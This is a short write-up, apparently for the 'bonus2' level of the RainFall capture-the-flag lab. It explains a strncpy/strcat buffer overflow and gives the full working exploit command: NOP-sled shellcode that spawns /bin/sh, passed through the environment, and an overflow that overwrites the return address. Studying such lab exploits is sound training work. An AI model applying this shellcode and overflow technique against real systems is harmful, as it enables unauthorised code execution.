@@ -1,4 +1,19 @@
+After reversing the program we can see there is a vulnerability in the main with the two strncpy()
+If we overflow the first one, the string won't be null terminated and when greetuser will strcat
+the greeting with our inputs we will be able to overwrite eip.
 
+To get the offset of argv[2] where we can overwrite the address I filled argv[1] and used an eip string finder.
+The offset is 23, so I need to write 23 random char in argv[2] + the address to which
+I want to redirect the execution.
+
+I also need to pass a shellcode through the env and get it's address. So I ran gdb with an empty
+environnment and printed the env to find an address in my nop sled
+
+x/10s *((char**)environ)
+
+0xbffffd7c is ok
+
+I just put all thoses parts together and the exploit worked !
 
 bonus2@RainFall:~$ cat - | env -i LANG=nl SHELLCODE=`perl -e 'print "\x90"x500 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'` ./bonus2 `perl -e 'print "A"x60 . " " . "A"x23 . "\xc7\xfd\xff\xbf"'`
 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
